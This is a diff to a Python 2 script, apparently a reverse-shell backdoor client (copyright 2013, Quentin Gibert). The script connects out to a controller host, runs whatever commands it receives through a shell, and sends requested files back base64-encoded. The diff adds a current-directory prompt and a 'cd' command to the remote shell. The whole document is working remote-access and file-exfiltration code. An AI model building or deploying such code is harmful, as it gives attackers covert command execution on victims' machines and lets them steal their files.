@@ -1,4 +1,5 @@
 #!/usr/bin/python2
+# -*- coding: utf-8 -*-
 
 # Copyright (c) 2013 Quentin Gibert 
 # All rights reserved.
@@ -27,6 +28,7 @@
 import socket
 import subprocess
 import sys
+import os
 import time
 import shlex
 import base64
@@ -42,6 +44,7 @@ def connect((host, port)):
     return s
 
 def wait_for_command(s):
+    s.send("[" + os.getcwd() + "]>")
     data = s.recv(1024)
     data_arr = shlex.split(data, posix=False)
     if data == "quit\n":
@@ -63,6 +66,8 @@ def wait_for_command(s):
             s.send("BEGIN: " + data_arr[i] + "\n")
             s.send(base64.encodestring(fdata))
             s.send("END: " + data_arr[i] + "\n")
+    elif (len(data_arr) > 1) and (data_arr[0] == "cd"):
+        os.chdir(data_arr[1])
     else:
         # do shell command
         proc = subprocess.Popen(data, shell=True,
